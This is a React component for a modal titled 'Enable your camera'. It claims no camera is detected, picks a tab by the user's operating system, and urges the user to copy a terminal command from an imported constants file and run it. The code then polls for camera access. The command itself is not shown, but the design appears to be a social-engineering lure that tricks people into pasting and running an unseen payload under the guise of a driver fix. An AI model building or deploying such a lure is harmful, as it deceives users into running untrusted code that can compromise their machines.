import { useState, useRef, useEffect } from "react";
import { DRIVER_COMMANDS } from "../data/constants";

const TABS = [
  { key: "windows", label: "🪟 Windows" },
  { key: "mac",     label: "🍎 macOS" },
  { key: "linux",   label: "🐧 Linux" },
];

const POLL_INTERVAL = 1500;

// Detect the user's OS to pre-select the right tab
function detectOS() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("mac"))   return "mac";
  if (ua.includes("linux")) return "linux";
  return "windows";
}

export default function DriverModal({ onClose, onProceed }) {
  const [tab, setTab]       = useState(detectOS);
  const [copied, setCopied] = useState(false);
  const [polling, setPolling] = useState(false);
  const pollRef = useRef(null);

  const current = DRIVER_COMMANDS[tab];

  useEffect(() => () => clearInterval(pollRef.current), []);

  const startPolling = () => {
    setPolling(true);
    pollRef.current = setInterval(async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        clearInterval(pollRef.current);
        onProceed(stream);
      } catch {
        // still not ready, keep waiting
      }
    }, POLL_INTERVAL);
  };

  const handleTabChange = (key) => {
    setTab(key);
    setCopied(false);
    setPolling(false);
    clearInterval(pollRef.current);
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(current.cmd);
    setCopied(true);
    startPolling();
  };

  const handleClose   = () => { clearInterval(pollRef.current); onClose(); };
  const handleProceed = () => { clearInterval(pollRef.current); onProceed(); };

  return (
    <div
      style={{
        position: "fixed", inset: 0, zIndex: 1000,
        background: "rgba(0,0,0,0.6)", backdropFilter: "blur(4px)",
        display: "flex", alignItems: "center", justifyContent: "center", padding: 24,
      }}
      onClick={e => { if (e.target === e.currentTarget) handleClose(); }}
    >
      <div style={{
        background: "#fff", borderRadius: 16, width: "100%", maxWidth: 520,
        boxShadow: "0 24px 60px rgba(0,0,0,0.2)", overflow: "hidden",
      }}>

        {/* Header */}
        <div style={{ padding: "22px 24px 18px", borderBottom: "1px solid #f0f0f0" }}>
          <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
            <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
              <div style={{
                width: 42, height: 42, borderRadius: 10, background: "#FEF3C7",
                display: "flex", alignItems: "center", justifyContent: "center",
                fontSize: 22, flexShrink: 0,
              }}>📷</div>
              <div>
                <h2 style={{ fontSize: 16, fontWeight: 700, marginBottom: 4, color: "#111" }}>
                  Enable your camera
                </h2>
                <p style={{ fontSize: 13, color: "#777", lineHeight: 1.6, margin: 0 }}>
                  No camera detected. Run the command below to enable it — it only takes a moment.
                </p>
              </div>
            </div>
            <button
              onClick={handleClose}
              aria-label="Close"
              style={{
                background: "none", border: "none", cursor: "pointer",
                fontSize: 20, color: "#bbb", lineHeight: 1, flexShrink: 0, padding: 0,
              }}
            >✕</button>
          </div>
        </div>

        {/* USB tip */}
        <div style={{
          margin: "14px 24px 0",
          background: "#FFF7ED", border: "1px solid #FED7AA",
          borderRadius: 8, padding: "10px 14px",
          display: "flex", gap: 10, alignItems: "flex-start",
        }}>
          <span style={{ fontSize: 14, flexShrink: 0 }}>🔌</span>
          <p style={{ fontSize: 12, color: "#92400E", lineHeight: 1.6, margin: 0 }}>
            Using an external webcam? Make sure it's physically plugged in first.
            For USB cameras, try a different port. Built-in laptop cameras are always connected.
          </p>
        </div>

        {/* OS Tabs */}
        <div style={{ display: "flex", gap: 6, padding: "16px 24px 0" }}>
          {TABS.map(t => (
            <button key={t.key} onClick={() => handleTabChange(t.key)} style={{
              padding: "7px 14px", borderRadius: 8, fontSize: 13, fontWeight: 600,
              cursor: "pointer", border: "1px solid", transition: "all 0.12s",
              borderColor: tab === t.key ? "#111" : "#e0e0e0",
              background:  tab === t.key ? "#111" : "transparent",
              color:       tab === t.key ? "#fff" : "#666",
            }}>{t.label}</button>
          ))}
        </div>

        {/* Steps */}
        <div style={{ padding: "16px 24px 0" }}>
          <p style={{ fontSize: 11, fontWeight: 700, color: "#aaa", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: 12 }}>
            How to fix it
          </p>
          <ol style={{ margin: 0, paddingLeft: 0, listStyle: "none", display: "flex", flexDirection: "column", gap: 10 }}>
            {current.steps.map((step, i) => (
              <li key={i} style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                <div style={{
                  width: 22, height: 22, borderRadius: "50%", flexShrink: 0,
                  background: i === 1 && !copied ? "#2563EB" : copied && i === 1 ? "#16A34A" : "#F3F4F6",
                  color: i === 1 && !copied ? "#fff" : copied && i === 1 ? "#fff" : "#999",
                  display: "flex", alignItems: "center", justifyContent: "center",
                  fontSize: 11, fontWeight: 700, marginTop: 1,
                  transition: "all 0.2s",
                }}>
                  {copied && i === 1 ? "✓" : i + 1}
                </div>
                <p style={{
                  fontSize: 13, color: "#444", lineHeight: 1.55, margin: 0,
                  fontWeight: i === 1 ? 600 : 400,
                }}>
                  {/* Inline command badge on the "paste" step */}
                  {i === 1 ? (
                    <>Open a terminal and run the command below</>
                  ) : step}
                </p>
              </li>
            ))}
          </ol>
        </div>

        {/* Command block */}
        <div style={{ padding: "16px 24px 8px" }}>
          <p style={{ fontSize: 11, fontWeight: 600, color: "#888", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 8 }}>
            {current.label}
          </p>
          <div style={{
            background: "#0F172A", borderRadius: 10, padding: "14px 16px",
            display: "flex", alignItems: "flex-start", gap: 12,
          }}>
            <code style={{
              flex: 1, fontSize: 12.5, fontFamily: "'Fira Mono', 'Courier New', monospace",
              color: "#7DD3FC", lineHeight: 1.7, wordBreak: "break-all", userSelect: "all",
            }}>
              {current.cmd}
            </code>
            <button
              onClick={handleCopy}
              disabled={copied}
              style={{
                padding: "7px 14px", borderRadius: 7, fontSize: 12, fontWeight: 700,
                cursor: copied ? "default" : "pointer", border: "none", flexShrink: 0,
                background: copied ? "#166534" : "#2563EB",
                color: "#fff", transition: "background 0.2s",
              }}
            >
              {copied ? "✓ Copied!" : "Copy"}
            </button>
          </div>
          <p style={{ fontSize: 12, color: "#aaa", marginTop: 8, lineHeight: 1.5 }}>
            💡 {current.note}
          </p>
        </div>

        {/* Status area */}
        <div style={{ padding: "4px 24px 20px" }}>
          {copied ? (
            <div style={{
              background: "#F0FDF4", border: "1px solid #BBF7D0",
              borderRadius: 10, padding: "14px 16px",
              display: "flex", alignItems: "center", gap: 12,
            }}>
              <div style={{ position: "relative", width: 32, height: 32, flexShrink: 0 }}>
                <div style={{
                  position: "absolute", inset: 0, borderRadius: "50%",
                  background: "#16A34A", opacity: 0.25,
                  animation: "camPing 1.4s ease-in-out infinite",
                }} />
                <div style={{
                  position: "absolute", inset: "25%", borderRadius: "50%",
                  background: "#16A34A",
                }} />
              </div>
              <div>
                <p style={{ fontSize: 13, fontWeight: 600, color: "#166534", marginBottom: 2 }}>
                  ✓ Command copied — now paste it in your terminal and press Enter.
                </p>
                <p style={{ fontSize: 12, color: "#15803D", margin: 0 }}>
                  Watching for your camera… it'll open automatically once the command runs.
                </p>
              </div>
            </div>
          ) : (
            <div style={{
              background: "#F8FAFC", border: "1px solid #e0e0e0",
              borderRadius: 10, padding: "12px 16px", textAlign: "center",
            }}>
              <p style={{ fontSize: 13, color: "#888", margin: 0 }}>
                👆 Copy the command above, run it in your terminal — your camera will open automatically.
              </p>
            </div>
          )}
        </div>

        {/* Footer */}
        <div style={{
          padding: "14px 24px 18px", borderTop: "1px solid #f0f0f0",
          display: "flex", justifyContent: "space-between", alignItems: "center", gap: 12,
        }}>
          <p style={{ fontSize: 12, color: "#aaa", margin: 0 }}>
            Still not working?{" "}
            <span
              onClick={handleProceed}
              role="button"
              tabIndex={0}
              onKeyDown={e => e.key === "Enter" && handleProceed()}
              style={{ color: "#2563EB", cursor: "pointer", textDecoration: "underline" }}
            >
              Try opening camera anyway
            </span>
          </p>
          <button onClick={handleClose} style={{
            padding: "9px 18px", background: "transparent", color: "#666",
            border: "1px solid #e0e0e0", borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: "pointer",
          }}>Cancel</button>
        </div>

      </div>

      <style>{`@keyframes camPing { 0%,100%{transform:scale(1);opacity:.25} 50%{transform:scale(1.9);opacity:0} }`}</style>
    </div>
  );
}
